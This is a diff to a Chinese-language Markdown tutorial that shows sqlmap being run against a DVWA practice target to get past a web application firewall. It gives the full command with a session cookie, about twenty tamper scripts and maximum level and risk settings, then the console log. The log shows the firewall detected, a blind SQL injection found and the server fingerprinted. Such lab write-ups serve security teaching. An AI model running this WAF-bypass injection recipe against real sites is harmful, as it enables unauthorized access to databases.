@@ -312,7 +312,7 @@ $ sudo apt-get install sqlmap
 ```
 或是到官網下載使用：[http://sqlmap.org/](http://sqlmap.org/)
 ```github
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 ```
 #### `-u`是要檢測的網址，`--identify-waf`是對WAF / IPS / IDS保護進行全面測試
 ```Bash
@@ -416,6 +416,104 @@ sqlmap got a 302 redirect to 'http://120.114.140.30:80/DVWA/login.php'. Do you w
 
 ### 使用SQLmap繞過WAF
 ```Bash
+ python sqlmap.py -u "http://120.114.140.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=ikv86pst3juaqapnlncss7vk42" --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --flush-session
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.2.4.18#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
 
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 21:27:32
+
+[21:27:32] [INFO] loading tamper module 'apostrophemask'
+[21:27:32] [INFO] loading tamper module 'apostrophenullencode'
+[21:27:32] [INFO] loading tamper module 'base64encode'
+it appears that you might have mixed the order of tamper scripts. Do you want to auto resolve this? [Y/n/q] y
+[21:27:34] [INFO] loading tamper module 'between'
+[21:27:34] [INFO] loading tamper module 'chardoubleencode'
+[21:27:34] [INFO] loading tamper module 'charencode'
+[21:27:34] [INFO] loading tamper module 'charunicodeencode'
+[21:27:34] [WARNING] tamper script 'charunicodeencode' is only meant to be run against ASP or ASP.NET web applications
+[21:27:34] [INFO] loading tamper module 'equaltolike'
+[21:27:34] [WARNING] tamper script 'equaltolike' is unlikely to work against PostgreSQL
+[21:27:34] [INFO] loading tamper module 'greatest'
+[21:27:34] [INFO] loading tamper module 'ifnull2ifisnull'
+[21:27:34] [INFO] loading tamper module 'multiplespaces'
+[21:27:34] [INFO] loading tamper module 'nonrecursivereplacement'
+[21:27:34] [INFO] loading tamper module 'percentage'
+[21:27:34] [WARNING] tamper script 'percentage' is only meant to be run against ASP web applications
+[21:27:34] [INFO] loading tamper module 'randomcase'
+[21:27:34] [INFO] loading tamper module 'securesphere'
+[21:27:34] [INFO] loading tamper module 'space2comment'
+[21:27:34] [INFO] loading tamper module 'space2plus'
+[21:27:34] [INFO] loading tamper module 'space2randomblank'
+[21:27:34] [INFO] loading tamper module 'unionalltounion'
+[21:27:34] [INFO] loading tamper module 'unmagicquotes'
+[21:27:34] [WARNING] using too many tamper scripts is usually not a good idea
+[21:27:34] [INFO] flushing session file
+[21:27:34] [INFO] testing connection to the target URL
+[21:27:34] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+#這邊偵測到WAF防護，按y接受檢測
+[21:27:34] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] y
+[21:27:36] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
+[21:27:36] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
+[21:27:36] [CRITICAL] WAF/IPS/IDS identified as 'Generic (Unknown)'
+[21:27:36] [WARNING] WAF/IPS/IDS specific response can be found in '/tmp/sqlmapNIwwqY27183/sqlmapresponse-Wm1quw'. If you know the details on used protection please report it along with specific response to 'dev@sqlmap.org'
+are you sure that you want to continue with further target testing? [y/N] y
+[21:27:37] [INFO] testing if the target URL content is stable
+[21:27:37] [INFO] target URL content is stable
+[21:27:37] [INFO] testing if GET parameter 'id' is dynamic
+[21:27:37] [WARNING] currently only couple of keywords are being processed ('UNION', 'SELECT', 'INSERT', 'UPDATE', 'FROM', 'WHERE'). You can set it manually according to your needs
+[21:27:37] [WARNING] GET parameter 'id' does not appear to be dynamic
+[21:27:37] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[21:27:37] [INFO] testing for SQL injection on GET parameter 'id'
+[21:27:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:27:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[21:27:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[21:27:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
+[21:27:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
+[21:27:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)'
+[21:27:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:27:44] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --code=200)
+# 偵測到mysql類型資料庫，按y確定跳過偵測其他資料庫
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+[21:27:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:27:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:27:48] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[21:27:48] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[21:27:49] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[21:27:50] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[21:27:51] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[21:27:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[21:27:54] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[21:27:56] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[21:27:58] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[21:28:00] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+[21:28:01] [WARNING] it appears that some non-alphanumeric characters (i.e. ()) are filtered by the back-end server. There is a strong possibility that sqlmap won't be able to properly exploit this vulnerability
+[21:28:01] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
+# 偵測到'id'是個攻擊參數，按y跳過其他參數測試
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 650 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=1') AND 3898=3898#&Submit=Submit
+---
+[21:28:05] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[21:28:05] [INFO] the back-end DBMS is MySQL
+# 完成跳過WAF防護，偵測到伺服器系統版本、網頁軟體服務、資料庫版本
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL Unknown
+[21:28:05] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 4 times, 404 (Not Found) - 1 times, 414 (Request-URI Too Long) - 637 times
+[21:28:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/120.114.140.30'
+
+[*] shutting down at 21:28:05
 ```
 > 參考資料: [nginx下安装配置modsecurity waf防火墙（附完整编译、配置、排错、详细规则）](http://f2ex.cn/nginx-installed-configuration-modsecurity-waf/)
